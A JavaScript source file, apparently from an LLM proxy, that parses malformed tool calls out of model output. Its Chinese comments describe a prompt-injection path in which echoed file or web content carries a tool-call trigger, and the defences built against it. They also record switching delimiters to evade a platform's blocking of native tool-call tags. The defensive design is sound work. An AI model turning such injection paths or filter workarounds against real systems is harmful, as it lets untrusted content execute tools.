const { generateUUID } = require('./tools.js');
const { logger } = require('./logger');
const {
  AGENT_FINAL_OPEN,
  AGENT_FINAL_CLOSE,
  AGENT_BLOCKED_OPEN,
  AGENT_BLOCKED_CLOSE,
  TOOL_CALL_OPEN,
  TOOL_CALL_CLOSE
} = require('./agent-turn.js');

// TOOL_CALL_OPEN / TOOL_CALL_CLOSE 从 agent-turn.js 引入：规范标记与重试提示必须锁步，
// 换分隔符的完整理由（Qwen 平台拦截原生 <tool_call>）也写在那里。

/**
 * 工具**结果**的分隔符。
 *
 * 历史：最早是 `<tool_response tool_call_id="…" name="…">` —— 和当时的调用标签 `<tool_call`
 * 共享前缀，还是个带属性的 HTML 元素，模型每一轮都能看见它，于是把它的形状学到调用标签上，
 * 产出 `<tool_call_id_1>`、`<tool_call name="read_file">`、`<tool_call_result>` 这一族坏标签。
 * 于是结果标记先改成了不带尖括号、不带属性的行标记 `[TOOL RESULT: …]`。
 *
 * 现在调用标记也是方括号行标记 `[TOOL CALL]`（为躲开 Qwen 平台对原生 `<tool_call>` 的拦截，
 * 见 agent-turn.js）。两者因此**共享 `[TOOL ` 前缀**，不再"完全不一样"。这不会造成解析冲突：
 * 调用触发器认的是 `tool[ _-]call`，结果标记是 `TOOL RESULT`，关键词不同，互不交叉匹配；
 * 名字又只能来自负载。残留的是模型可能把两者拼混（`[TOOL CALL RESULT]`），但拼出来的东西
 * 要么命中调用触发器（照常从负载恢复），要么谁都不命中（当正文放行），风险远低于当年那一族。
 */
const TOOL_RESULT_OPEN = '[TOOL RESULT: ';
const TOOL_RESULT_CLOSE = '[END TOOL RESULT]';

/**
 * 触发器：一个“像 tool_call”的开标签。它不再需要写对。
 *
 * 模型几乎每次都把标签写坏 —— `<tool_call\n>`、`<tool_call">`、`<tool_call=`、
 * `<tool_call type="function">`、`<tool_call_id_1>`、`<tool_call name="read_file">` ——
 * 却几乎每次都把标签后面的 JSON 负载写对（149 段真实抓包里只出现过一次干净的开标签）。
 * 而且它**静默**失败：标签对不上时 hasParseError() 仍是 false，没有错误也没有日志，
 * 于是没有重试、没有记录，调用方只收到一段裸 XML。工具名写错查得出来，标签写错查不出来。
 *
 * 所以识别拆成两段：
 *   1) 触发器只负责**定界**，长度有上界；
 *   2) 调用从触发器之后 TOOL_CALL_PAYLOAD_WINDOW 个字符内的 JSON 负载里恢复。
 *
 * 触发器**收窄**注入面，但并不封闭它。不要在任何地方声称这里防住了注入：模型复述回来的
 * 不可信内容（一个文件、一段网页）自己就可以带上一个触发器。真正扛住边界的是另外两条，
 * 两条都在语料上量过代价：
 *   1) 工具名只能来自负载的 name 键，**绝不**来自触发器尾巴。代价：159 段里 2 段。
 *      —— 否则 `<tool_call bash>{"cmd":"…"}` 这种从文件内容里抄回来的片段会真的执行。
 *   2) 触发器必须是可见回答里第一个非空白内容 —— 这本来就是提示词对模型的要求。
 *      代价：159 段里 8 段。
 * 即便如此，破坏性工具的确认权仍然在客户端那边，不在这里。
 *
 * 位置门的现状（2026-09-02，narrated-toolcall spec）：提示词**仍然**要求调用是回答的
 * 第一个内容（buildToolSystemPrompt 的措辞不动），但解析器对叙述**宽容**：正文之后的
 * 触发器（或行首的裸负载 + 方括号闭标记）不再按位置一刀切压制，而是过**语义门**
 * （gateAfterProsePayload：白名单 + required 键）—— 且只在调用方带齐抢救上下文
 * （白名单 + toolSchemas）时放行，否则保持旧的压制。anthropic 与 OpenAI 的 Agent
 * 运行时都传 toolSchemas（后者自 spec-agent-turn-cutoff-openai-parity 起），但都**只在
 * answer phase**：think phase 的解析器两条路径都不带 schema。
 * 第一位置的规则一字不改。这样做的理由与接受的风险写在 spec 的 Intent 里：位置只是
 * 意图的弱代理，它从没保护过位置 0，却丢掉了每一个"Let me check…"后面的真实调用。
 *
 * 触发器同时还是缓冲区的上界：无触发器的自由扫描必须先缓冲一个任意长的对象才能判断，
 * chunk 边界暂存区随之失去上界。
 *
 * 实测（85 段带触发器的抓包回合）：精确标签 49%；无触发器的自由扫描 90%，但边界和上界
 * 全丢；触发器 + 负载 95%。只有去掉触发器才救得回来的回合：0 段。
 *
 * 只影响**读取**。foldToolMessages 回写历史时使用规范形式 [TOOL CALL]。
 */
// 两个头都认：方括号是规范形式，尖括号是模型 RL 惯性下仍可能吐出的旧原生形式。
// 旧形式被平台拦截时我们本来就收不到；漏网的那些照旧回收。
//
// 这里**不**用否定环视去甩掉 `[tool calls](url)` 这类 Markdown 链接：环视要往后看几十个字符，
// 而流式解析器在 chunk 边界上看到的是半截 `[tool calls]`（'(' 还没到），环视据此提前放行，
// 于是整段和流式两条路径对同一输入给出不同结果 —— 分歧比误报本身更糟。改为在**定界点**判断
// （isMarkdownLinkTail），那时两条路径都已经拿到了触发器到负载之间的完整 tail。
const TOOL_CALL_TRIGGER_RE = /<[ \t]{0,4}tool_calls?|\[[ \t]{0,4}tool[ \t_-]{1,2}calls?/i;

// 触发器到负载之间允许的最大间隔。中位数 3、最大 49、128 上界 —— 这些数字全部量自
// **尖括号**语料（149 段抓包），方括号形式还没有对应的语料。沿用是合理默认：方括号是
// 我们自己教给模型、要求写干净的形式，装饰理应更少而不是更多。真要偏离，得先抓一批
// [TOOL CALL] 的真实输出再调，别凭感觉动这个 128。
const TOOL_CALL_PAYLOAD_WINDOW = 128;

/** 触发器能匹配到的最长文本，用作 chunk 边界暂存区的上界。取两种形式里更长的那个。 */
const TOOL_CALL_TRIGGER_MAX = Math.max(
  '<    tool_calls'.length,
  '[    tool  calls'.length
);

/**
 * 闭标签同样会被写坏（`</tool_call">`、`</tool_call result>`），而且常和开标签不对称。
 * 它不携带任何信息，唯一的用处是别把它当正文吐出去，所以只用来**吞掉**，并且有上界。
 */
// 闭标签也会被写坏：`</tool_call">`、`</tool_call\n>`、`</tool_call result>`、
// `</tool_call_id_1>`、`</tool_call＞`（中文输入法的全角尖括号）。
//
// 尾巴必须收得很紧。之前用 `[^<>＞]{0,64}` 太松：`</tool_call and then 5 > 3` 里那个 '>'
// 让它一口吞掉 24 个字符的**真实回答**。现在只允许「一段不含空白的碎片 + 至多一个单词」，
// 多词散文因此匹配不上，宁可让闭标签泄漏，也绝不吃掉模型的回答。
const TOOL_CALL_CLOSE_RE =
  /^<[ \t]{0,4}\/[ \t]{0,4}tool_calls?[^\s<>＞]{0,16}[ \t\r\n]{0,4}(?:[A-Za-z_][\w-]{0,15})?[ \t\r\n]{0,4}[>＞]/i;
const TOOL_CALL_CLOSE_BARE_RE = /^<[ \t]{0,4}\/[ \t]{0,4}tool_calls?/i;
// 方括号闭标记：`[END TOOL CALL]` 是规范形式，`[/TOOL CALL]` 是可预期的变体。
// 与尖括号闭标签同一条纪律：只用来吞掉、有上界、多词散文匹配不上。
// `[TOOL RESULT: …]` 既没有 END 也没有 '/'，按构造匹配不上 —— 模型伪造的结果块
// 不会被当成闭标记吃掉。
// 装饰段同时排除 '[' 和 ']'：consumeTrailingCloser 的 grow 判据把内部的 '['
// 当成"这段永远成不了闭标记"的证据（`!slice.includes('[', 1)`），正则这一半也必须认同，
// 否则 `[END TOOL CALL[[[]` 在正则里算闭标记、在 grow 判据里不算，两半自相矛盾。
const TOOL_CALL_CLOSE_BRACKET_RE =
  /^\[[ \t]{0,4}(?:END[ \t_-]{1,2}|\/[ \t]{0,4})TOOL[ \t_-]{1,2}CALLs?[^\s[\]]{0,16}[ \t\r\n]{0,4}\]/i;
const TOOL_CALL_CLOSE_BRACKET_BARE_RE =
  /^\[[ \t]{0,4}(?:END[ \t_-]{1,2}|\/[ \t]{0,4})TOOL[ \t_-]{1,2}CALLs?/i;
// 配平点之后、闭标记之前的**闭合残渣**：模型多写了一层 `}` / `]`。实测 2026-09-06
// （Claude Code 经 /v1/messages）：`{"name":"Bash","arguments":{…}}}\n[END TOOL CALL]`
// —— 多出的 '}' 让闭标记不再“紧邻”，调用按无闭标记收尾，'}' 作为正文放出，随后的
// `[END TOOL CALL]` 成了孤儿也漏进正文，而且一条 WARN 都没有。残渣既不是负载也不是
// 回答，只可能是协议，所以连同空白一起跳过，让闭标记重新紧邻。上界很小且全有全无：
// 一屏 '}' 不是残渣，是别的东西，整段按原样当正文处理。
const TRAILING_DEBRIS_MAX = 8;
// 上界是两种闭标记里更长的那个。两个都是手写的镜像字面量，必须和上面的正则**用眼睛**保持
// 同步 —— 这是这种写法的固有风险。当前方括号臂（63）其实盖过尖括号臂（58），而方括号闭标记
// 最长也就 42 个字符，本来就落在任一臂之下；也就是说方括号那个字面量此刻是冗余的安全垫，
// 就算它写短了也咬不出 bug（除非有人把两个臂同时改短到 42 以下）。真要收紧成一个精确不变式，
// 得把常量导出、在测试里断言"正则匹配长度 ≤ MAX"。
const TOOL_CALL_CLOSE_MAX = Math.max(
  '</    tool_calls'.length + 42,
  '[    END  TOOL  CALLS'.length + 42
);

/**
 * 触发之后允许缓冲的上限。头部注释说触发器给缓冲区封了顶，但那只对「窗口里找不到负载」
 * 成立：一旦找到 '{'，配平括号会一直等下去，一个永远配不平的 '{' 能把整条流吃进内存。
 *
 * 这里**不是**窗口的小倍数：write_file 之类的调用会把整份文件正文放进 arguments，几 KB
 * 到几百 KB 都算正常，按 1024 封顶会砍掉真实调用。1 MiB 远高于任何合理的工具参数，
 * 同时把「无界增长」变成有界失败。
 */
const TOOL_CALL_SPAN_MAX = 1024 * 1024;

/**
 * 「泄漏的调用负载」的形状谓词：开头（允许前导空白）就是一个 JSON 对象，且
 * "name" / "arguments" 两个键出现在**这个对象自己**的范围里。普通 JSON 答案
 * （缺任一键，或键在别处）不会误伤。
 *
 * 作用域是刻意收紧的：
 * - 对象已配平 → 键必须在对象文本之内。早先“全文任意位置”的版本会被后文一个
 *   真调用负载里的键点着，把 `{"result":…}` 这种普通 JSON 答案误当成抢救候选。
 * - 尚未配平（流式判定中）→ 键在已见文本里找，但 "name" 必须出现在开头 256 字符
 *   之内（LEAKED_PAYLOAD_NAME_WINDOW）。所有真实泄漏样本都以 name 开头；这个窗口
 *   让流式的扣留判定有界 —— 一个普通的大 JSON 答案最多被扣 256 字符就恢复流式。
 *
 * 单一来源：残渣检测（containsOrphanProtocolResidue，决定 malformed_protocol 重试）
 * 和合成开端（matchToolCallOpening，决定要不要试着抢救成真调用）都消费**这一个**
 * 谓词。两边一旦各自维护一份，就会出现“检测说是泄漏、抢救说不是”的缝隙 ——
 * 泄漏永远卡在重试环里。不要复制，不要内联。
 */
const LEAKED_PAYLOAD_NAME_RE = /"name"\s*:/;
const LEAKED_PAYLOAD_ARGS_RE = /"arguments"\s*:/;
const LEAKED_PAYLOAD_NAME_WINDOW = 256;
const isLeakedToolPayloadShape = (value) => {
  const trimmed = String(value || '').trimStart();
  if (!trimmed.startsWith('{')) return false;
  // 便宜的窗口判断先行（review loop 2）：配平扫描是 O(对象长度)，一份几千个行首 '{'
  // 的大文本若每个候选都先配平再看 "name"，整体就是平方级。窗口里没有 "name" 的
  // 候选到此为止；配平后的对象范围是它的前缀，判据不变。
  if (!LEAKED_PAYLOAD_NAME_RE.test(trimmed.slice(0, LEAKED_PAYLOAD_NAME_WINDOW))) return false;
  const object = extractBalancedObject(trimmed, 0);
  const scope = object ? object.text : trimmed;
  return LEAKED_PAYLOAD_NAME_RE.test(scope.slice(0, LEAKED_PAYLOAD_NAME_WINDOW)) &&
    LEAKED_PAYLOAD_ARGS_RE.test(scope);
};

/**
 * 正文之后的裸负载候选（行首 '{'）的"像不像负载"谓词 —— 比首位谓词多两道上界：
 * 从对象的 '{' 起 256 字符内必须见到 "name"、4352 字符（256 + 4 KiB）内必须见到
 * "arguments"（两个窗口都从 '{' 量起，不是从 "name" 之后量起），对象必须在 16 KiB 内
 * 配平。上界是流式扣留的代价封顶：回答中间打印出来的一份 package.json 也以行首 '{'
 * 开头、前 256 字符里就有 "name"，不能让交付停到它配平为止。整段路径用**同一个**
 * 谓词、**同一组上界**判候选，两条路径才对同一份文本给出同一个结果（parity，
 * review loop 2）：
 *   - 已在 16 KiB 内配平：两个键都必须落在对象自己的范围里（与首位谓词同一条纪律：
 *     后文一个真调用的键不能把前面一个普通对象点着），"arguments" 仍受窗口约束。
 *   - 16 KiB 内没配平（永远配不平、或在更远处才配平 —— 流式在 16 KiB 处分不清
 *     两者，整段路径也就不去分）：只看窗口；结算点把它按"配不平"处理（残片切点 +
 *     同一条 warning），两条路径给出同一个结果。
 * 便宜的窗口判断先于配平扫描（配平是 O(对象长度)，见 isLeakedToolPayloadShape）。
 */
const AFTER_PROSE_ARGS_WINDOW = LEAKED_PAYLOAD_NAME_WINDOW + 4096;
const AFTER_PROSE_PAYLOAD_MAX = 16 * 1024;
// 整段路径快路径用：文本里有没有任何一个行首 '{'（与 nextLineStartBrace 同一定义）。
const LINE_START_BRACE_RE = /(?:^|\n)[ \t\r]*\{/;
/** 正文之后的配平：只在 AFTER_PROSE_PAYLOAD_MAX 内找闭合，超出即视为配不平（两条路径同一上界）。 */
const extractAfterProseObject = (text, start) => {
  const object = extractBalancedObject(text.slice(start, start + AFTER_PROSE_PAYLOAD_MAX), 0);
  return object ? { text: object.text, end: start + object.end } : null;
};
const isPlausibleAfterProsePayload = (value) => {
  const text = String(value || '');
  if (!text.startsWith('{')) return false;
  if (!LEAKED_PAYLOAD_NAME_RE.test(text.slice(0, LEAKED_PAYLOAD_NAME_WINDOW))) return false;
  if (!LEAKED_PAYLOAD_ARGS_RE.test(text.slice(0, AFTER_PROSE_ARGS_WINDOW))) return false;
  const object = extractAfterProseObject(text, 0);
  if (!object) return true;
  return LEAKED_PAYLOAD_NAME_RE.test(object.text.slice(0, LEAKED_PAYLOAD_NAME_WINDOW)) &&
    LEAKED_PAYLOAD_ARGS_RE.test(object.text.slice(0, AFTER_PROSE_ARGS_WINDOW));
};

/**
 * 从 from 起、limit 之前，下一个**行首** '{' 的下标：本行在它之前只有空白。
 * atLineStart 说明 from 本身是否处在行首（流式解析器跨 chunk 记住"上一个放行的
 * 字节是不是换行"，整段路径看 fullText[position-1]）；不在行首时先跳到下一行。
 * 行中的 '{' 永远不是候选 —— `Here is an example: {"name":…}` 是文档，不是调用。
 * @returns {number} -1 表示没有
 */
const nextLineStartBrace = (text, from, atLineStart, limit = text.length) => {
  let lineAt = from;
  if (!atLineStart) {
    const newline = text.indexOf('\n', from);
    if (newline === -1) return -1;
    lineAt = newline + 1;
  }
  while (lineAt < limit) {
    let i = lineAt;
    while (i < text.length && (text[i] === ' ' || text[i] === '\t' || text[i] === '\r')) i += 1;
    if (i < limit && text[i] === '{') return i;
    const newline = text.indexOf('\n', i);
    if (newline === -1) return -1;
    lineAt = newline + 1;
  }
  return -1;
};

/**
 * 从 from 起、limit 之前，下一个**像负载**的行首 '{'：结构由 nextLineStartBrace 给出，
 * 形状按位置选谓词（首位 isLeakedToolPayloadShape / 正文之后 isPlausibleAfterProsePayload）。
 * 三个消费者共用（识别器、残片切点、抢救的锚点检查），候选的定义只有这一份。
 * 便宜的 "name" 窗口判断先行，像负载的候选才切出（可能很长的）尾巴给谓词。
 * @returns {number} -1 表示没有
 */
const nextPayloadCandidate = (text, from, atLineStart, limit, afterProse) => {
  let at = nextLineStartBrace(text, from, atLineStart, limit);
  while (at !== -1) {
    if (LEAKED_PAYLOAD_NAME_RE.test(text.slice(at, at + LEAKED_PAYLOAD_NAME_WINDOW))) {
      const shape = afterProse
        ? isPlausibleAfterProsePayload(text.slice(at, at + AFTER_PROSE_PAYLOAD_MAX + 1))
        : isLeakedToolPayloadShape(text.slice(at));
      if (shape) return at;
    }
    at = nextLineStartBrace(text, at + 1, false, limit);
  }
  return -1;
};

/**
 * index 处是否处在**行首**：上一个换行（或文本开头）到 index 之间只有空白。两条路径
 * 共用同一个谓词（review loop 2）：整段路径在每个扫描位置与残片切点之后的恢复点上问它
 * （`fullText[position-1] === '\n'` 会把缩进过的 `  {"name":…}` 拒之门外）；流式解析器
 * 用它在每个放行点更新 lineStart —— 放行的文本没有换行时沿用之前的状态（prior），
 * 于是切在前导空白中间的 chunk 边界也不会让下一个 '{' 失去行首身份。
 * 代价是 index 之前那一串空白的长度，遇到第一个非空白就停。
 * @param {string} text
 * @param {number} index
 * @param {boolean} [prior=true] - 文本开头之前的行首状态
 * @returns {boolean}
 */
const lineStartBefore = (text, index, prior = true) => {
  let i = index - 1;
  while (i >= 0 && (text[i] === ' ' || text[i] === '\t' || text[i] === '\r')) i -= 1;
  return i < 0 ? prior : text[i] === '\n';
};

/**
 * 记录正文当前是否处在代码上下文里。文档里的例子必须保持是例子：``` 围栏内，
 * 或同一行反引号数为奇数（行内代码）时，触发器不算触发器。
 * 增量式：只喂**已经放行**的正文，所以流式和整段两条路径可以共用同一套判断。
 */
const createCodeContextTracker = () => {
  let inFence = false;
  let ticksOnLine = 0;
  let run = 0;
  let runAtLineStart = true;   // 这串反引号前面，本行是不是只有空白
  let lineIsBlank = true;      // 本行到目前为止是不是只有空白

  // 围栏必须**顶行**（Markdown 的规则）。之前任何位置的三连反引号都会翻转围栏状态，
  // 于是 JSON 字符串里的 ``` 也算围栏；一旦错位就再也回不来，后面每个真实调用都被
  // 当成文档静默丢掉 —— 正是这次要消灭的那类无声失败。
  const settle = () => {
    if (run === 0) return;
    if (run >= 3 && runAtLineStart) {
      inFence = !inFence;
      ticksOnLine = 0;
    } else if (!inFence) {
      ticksOnLine += run;
    }
    run = 0;
  };

  return {
    consume: (text) => {
      for (let i = 0; i < text.length; i += 1) {
        const char = text[i];
        if (char === '`') {
          if (run === 0) runAtLineStart = lineIsBlank;
          run += 1;
          lineIsBlank = false;
          continue;
        }
        settle();
        if (char === '\n') {
          ticksOnLine = 0;
          lineIsBlank = true;
        } else if (char !== ' ' && char !== '\t' && char !== '\r') {
          lineIsBlank = false;
        }
      }
    },
    // 反引号可能被切在 chunk 边界上，所以这里结算一份副本，不能动真状态。
    inCode: () => {
      const fenceToggles = run >= 3 && (run === 0 ? lineIsBlank : runAtLineStart);
      const fence = fenceToggles ? !inFence : inFence;
      if (fence) return true;
      const ticks = fenceToggles ? 0 : ticksOnLine + run;
      return ticks % 2 === 1;
    }
  };
};

/**
 * 从 start 处的 '{' 开始做括号配平；字符串内部的括号不参与配平。
 * @returns {{ text: string, end: number }|null} null 表示还没闭合
 */
const extractBalancedObject = (text, start) => {
  let depth = 0;
  let inString = false;
  let escaped = false;
  for (let i = start; i < text.length; i += 1) {
    const char = text[i];
    if (inString) {
      if (escaped) escaped = false;
      else if (char === '\\') escaped = true;
      else if (char === '"') inString = false;
      continue;
    }
    if (char === '"') inString = true;
    else if (char === '{') depth += 1;
    else if (char === '}') {
      depth -= 1;
      if (depth === 0) return { text: text.slice(start, i + 1), end: i + 1 };
    }
  }
  return null;
};

/**
 * 触发器到负载之间的 tail 若长成 Markdown 链接的收尾（`](`），这就不是调用而是链接：
 * `[tool calls](https://…) … {json}`。真正的方括号调用 `[TOOL CALL]\n{…}` 的 tail 是 `]\n`，
 * 不含 `](`。只对方括号触发器判断（尖括号形式不会撞上 Markdown 链接语法）。
 * @param {string} triggerText 触发器原文（用来区分方括号 / 尖括号形式）
 * @param {string} tail 触发器结尾到负载 '{' 之间的文本
 * @returns {boolean}
 */
const isMarkdownLinkTail = (triggerText, tail) =>
  triggerText.charAt(0) === '[' && /\]\(/.test(tail);

/**
 * 触发器之后、窗口之内第一个 '{' 的下标。
 * @returns {number} >=0 负载起点；-1 窗口内没有负载；-2 还没看满窗口，需要更多输入
 */
const findPayloadStart = (text, from, canGrow) => {
  const limit = Math.min(text.length, from + TOOL_CALL_PAYLOAD_WINDOW);
  for (let i = from; i < limit; i += 1) {
    if (text[i] === '{') return i;
  }
  if (canGrow && text.length - from < TOOL_CALL_PAYLOAD_WINDOW) return -2;
  return -1;
};

/**
 * 找回答里的下一个调用开端。正则触发器优先；找不到时考虑**合成开端**：
 * 实测泄漏（2026-08-31 10:12–10:17）里模型把开标记整个吞掉，答案直接以
 * `{"name":…,"arguments":…}` 负载开头再跟 `[END TOOL CALL]` —— 没有触发器可点火，
 * 整段作为正文流向客户端。合成开端让这种负载重新进入解析管线，由后续闸门
 * （JSON 配平、强制闭标记、名字白名单）决定它是不是调用。
 *
 * 位置门在这里：只有「此前没有任何非空白正文」（emittedProse=false —— 回答开头，
 * 或紧跟上一个已完成的调用，中间只有空白）且眼前第一个非空白字符是 '{'、整段
 * 文本满足 isLeakedToolPayloadShape 时才产生合成开端。调用方把代码上下文
 * （code.inCode()）并进 emittedProse 传入 —— 围栏/行内代码里的负载永远是文档。
 *
 * 合成开端按位置优先于更靠后的正则触发器：两条解析路径（整段 / 流式）都是从左
 * 到右消费，流式在正则触发器抵达之前就已经看见了开头的负载；谁在前谁生效才能
 * 保证两条路径对同一份文本给出同一个结果。合法的合成开端前面只有空白，正则
 * 触发器不可能匹配到它前面去，所以这条规则等价于「合成开端存在即生效」。
 *
 * canSalvage 默认关闭（fail closed）：没有**非空**的 allowedToolNames 白名单时
 * 名字闸门是放行一切的旧语义，抢救会给未声明的名字捏出 tool_use —— 所以无白名单
 * 就无抢救。正则触发器不受影响（旧行为保持）。
 *
 * 正文之后（emittedProse=true，或首位对象不是负载、其后的正文尚未放行）的合成开端
 * 只在 canSalvageAfterProse（白名单 + toolSchemas 齐备）时产生，候选只能是**行首**
 * '{'（isPlausibleAfterProsePayload），闭标记仍然强制、语义门在结算点。行中的
 * '{' 永远不是候选。inCode 单独传：围栏/行内代码里的 '{' 是文档，两种合成开端都不产生。
 * @param {string} text - 待扫描文本（从当前位置起）
 * @param {{ emittedProse?: boolean, canSalvage?: boolean, canSalvageAfterProse?: boolean,
 *           inCode?: boolean, atLineStart?: boolean }} [options]
 * @returns {{ index: number, text: string, synthetic: boolean }|null}
 */
const matchToolCallOpening = (text, {
  emittedProse = false,
  canSalvage = false,
  canSalvageAfterProse = false,
  inCode = false,
  atLineStart = true
} = {}) => {
  const match = text.match(TOOL_CALL_TRIGGER_RE);
  const limit = match ? match.index : text.length;
  if (canSalvage && !inCode) {
    if (!emittedProse) {
      // 首位候选也必须在行首（review loop 2）：一个没有闭标记就收尾的片段之后，同一行的
      // ` {…}` 是行中的 '{' —— 它不是"回答的第一个内容"，只是上一个负载的尾巴。
      const braceAt = text.search(/\S/);
      if (braceAt !== -1 && text[braceAt] === '{' && braceAt < limit &&
          lineStartBefore(text, braceAt, atLineStart) && isLeakedToolPayloadShape(text)) {
        return { index: braceAt, text: '', synthetic: true };
      }
    }
    if (canSalvageAfterProse) {
      // 首位规则没命中：候选只能是行首 '{'，按位置从左到右取第一个像负载的。
      // 首位那个对象若被首位谓词拒绝，这里的谓词更严（配平时键须在对象内、有上界），
      // 不会把它捞回来 —— 它按正文放行，后面的候选才是"正文之后"的。
      const at = nextPayloadCandidate(text, 0, atLineStart, limit, true);
      if (at !== -1) return { index: at, text: '', synthetic: true };
    }
  }
  if (match) return { index: match.index, text: match[0], synthetic: false };
  return null;
};

/**
 * 负载被 ```json 围栏包起来时，把收尾的那道围栏也吞掉。
 * 只在触发器和负载之间确实出现过围栏时才吞 —— 否则孤零零的收尾围栏会漏进正文，
 * 还会把 createCodeContextTracker 翻转，让这一整条回复后面的触发器全被当成文档。
 * @returns {number} 跳过围栏之后的下标
 */
const skipTrailingFence = (text, from, tail, canGrow) => {
  if (!tail.includes('```')) return { end: from, needMore: false };
  let index = from;
  while (index < text.length && /\s/.test(text[index])) index += 1;
  if (index >= text.length) return { end: from, needMore: !!canGrow };
  if (text[index] !== '`') return { end: from, needMore: false };
  // 流式下可能只收到一两个反引号：分不清“不是围栏”和“还没收够”，就得等。
  // 不等的话围栏残片会当成正文放出去，emittedProse 被置位，后面那个干净的调用
  // 就被“触发器必须是第一个内容”挡掉 —— 整段路径拿 2 个调用，流式只拿 1 个。
  let ticks = 0;
  while (index + ticks < text.length && text[index + ticks] === '`') ticks += 1;
  if (ticks < 3) {
    if (canGrow && index + ticks >= text.length) return { end: from, needMore: true };
    return { end: from, needMore: false };
  }
  return { end: index + ticks, needMore: false };
};

/**
 * 跳过配平点之后的空白和有上界的闭合残渣（见 TRAILING_DEBRIS_MAX）。
 * 全有全无：残渣超过上界就当作根本没有残渣，index 停在第一个非空白字符上。
 * @returns {{ index: number, debrisEnd: number }} index 是下一个待判定字符；
 *   debrisEnd 是残渣之后的位置，=== from 表示没有残渣（或残渣超界）
 */
const skipClosingDebris = (text, from) => {
  let index = from;
  while (index < text.length && /\s/.test(text[index])) index += 1;
  const firstNonBlank = index;
  let debris = 0;
  let debrisEnd = from;
  while (index < text.length) {
    const ch = text[index];
    if (/\s/.test(ch)) { index += 1; continue; }
    if (ch !== '}' && ch !== ']') break;
    if (debris >= TRAILING_DEBRIS_MAX) return { index: firstNonBlank, debrisEnd: from };
    debris += 1;
    index += 1;
    debrisEnd = index;
  }
  return { index, debrisEnd };
};

/**
 * 负载后面可能还跟着一个（同样写坏了的）闭标签，吞掉它，否则它会作为正文泄漏。
 * 配平点和闭标签之间允许有界的闭合残渣（`}}}` 多出的那个 '}'）；残渣不论后面有没有
 * 闭标签都吞掉 —— 它绝不是回答的一部分。
 * @returns {{ end: number, needMore: boolean }} end === from 表示既无闭标签也无残渣
 */
const consumeTrailingCloser = (text, from, canGrow) => {
  const { index, debrisEnd } = skipClosingDebris(text, from);
  if (index >= text.length) return { end: debrisEnd, needMore: !!canGrow };
  const head = text[index];
  if (head !== '<' && head !== '[') return { end: debrisEnd, needMore: false };
  const slice = text.slice(index, index + TOOL_CALL_CLOSE_MAX);
  const match = slice.match(head === '<' ? TOOL_CALL_CLOSE_RE : TOOL_CALL_CLOSE_BRACKET_RE);
  if (match) return { end: index + match[0].length, needMore: false };
  // `</too` / `[END TO` 还可能长成一个闭标记，`<div>` / `[note]` 不会。
  const terminator = head === '<'
    ? (!slice.includes('>') && !slice.includes('＞') && !slice.includes('<', 1))
    : (!slice.includes(']') && !slice.includes('[', 1));
  if (canGrow && slice.length < TOOL_CALL_CLOSE_MAX && terminator) {
    return { end: debrisEnd, needMore: true };
  }
  // 流已经结束了：光秃秃的 `</tool_call` / `[END TOOL CALL` 后面什么都没有，那它就是闭标记。
  const bare = slice.match(head === '<' ? TOOL_CALL_CLOSE_BARE_RE : TOOL_CALL_CLOSE_BRACKET_BARE_RE);
  if (!canGrow && bare && !slice.slice(bare[0].length).trim()) {
    return { end: index + slice.length, needMore: false };
  }
  return { end: debrisEnd, needMore: false };
};

/**
 * 合成开端的**强制**闭标记：负载配平之后必须紧跟一个方括号闭标记，之间只许空白。
 *
 * 这道门是抢救与注入之间的整条边界。裸负载本身在不可信内容里到处都是（一个配置
 * 文件、一段 README），写侧的 neutraliseResultMarkers 不会去动它 —— 改写负载形状
 * 会腐蚀结果里流过的合法 JSON。写侧动的是**闭标记**：折叠进历史的结果正文里，
 * 一切 `[END/／TOOL CALL` 的头字符都被换成 '('。所以「模型从结果里逐字引用回来的
 * 负载」永远凑不齐这里要求的闭标记，而「模型自己想调用却写坏了协议」的输出带着它。
 * 闭标记因此必须强制、必须紧邻（邻接规则）、必须是方括号形式 —— 三者都不许放松。
 *
 * 邻接规则的判定：配平点之后跳过空白和有界的闭合残渣（skipClosingDebris —— 残渣是
 * 模型自己写坏的协议，不是不可信内容能伪造出闭标记的途径，闭标记本身仍然强制）；
 * 一旦出现既非空白、又不能开始闭标记（'['）的字符，立刻判负（found:false），调用方
 * 立即按正文放行。只有尾巴还是纯空白、或是一个仍可能长成闭标记的 '[' 前缀
 * （上界 TOOL_CALL_CLOSE_MAX）时才等待更多输入。
 * @returns {{ end: number, needMore: boolean, found: boolean }}
 */
const consumeMandatoryBracketCloser = (text, from, canGrow) => {
  const { index } = skipClosingDebris(text, from);
  if (index >= text.length) return { end: from, needMore: !!canGrow, found: false };
  if (text[index] !== '[') return { end: from, needMore: false, found: false };
  const slice = text.slice(index, index + TOOL_CALL_CLOSE_MAX);
  const match = slice.match(TOOL_CALL_CLOSE_BRACKET_RE);
  if (match) return { end: index + match[0].length, needMore: false, found: true };
  const viable = !slice.includes(']') && !slice.includes('[', 1);
  if (canGrow && slice.length < TOOL_CALL_CLOSE_MAX && viable) {
    return { end: from, needMore: true, found: false };
  }
  // 流已结束：光秃秃的 `[END TOOL CALL`（少一个 ']'）后面什么都没有，那它就是闭标记。
  // 与 consumeTrailingCloser 同一条纪律；写侧的失效替换同样打掉它的头字符。
  // “后面什么都没有”查的是**真正的剩余文本**，不是 63 字符切片窗口 —— 只查窗口的话，
  // `[END TOOL CALL` + 一屏空白 + 真实正文也会被当成流尾裸闭标记，邻接边界被打穿。
  const bare = slice.match(TOOL_CALL_CLOSE_BRACKET_BARE_RE);
  if (!canGrow && bare && !text.slice(index + bare[0].length).trim()) {
    return { end: text.length, needMore: false, found: true };
  }
  return { end: from, needMore: false, found: false };
};

/**
 * flush 专用：closerSwallow 状态下，流死在半个**重复**闭标记上（`[END TOOL C` + EOF）。
 * 只认规范拼写的字面前缀（大小写不敏感，空格/下划线/连字符三种分隔，至少 1 个字符）；
 * 判不准宁可当正文放行 —— 吞掉真实回答比漏出半个标记更糟。
 * @param {string} value - flush 时 pendingText 从第一个非空白字符起的尾巴
 * @returns {boolean}
 */
const CLOSER_PREFIX_LITERALS = [
  'END TOOL CALLS', 'END_TOOL_CALLS', 'END-TOOL-CALLS',
  '/TOOL CALLS', '/TOOL_CALLS', '/TOOL-CALLS'
];
const isDanglingCloserPrefix = (value) => {
  const match = value.match(/^([[<])[ \t]{0,4}([^\r\n]*)$/);
  if (!match) return false;
  const rest = match[2].toUpperCase();
  if (rest.length === 0 || rest.length > TOOL_CALL_CLOSE_MAX) return false;
  return CLOSER_PREFIX_LITERALS.some(literal => literal.startsWith(rest));
};

/**
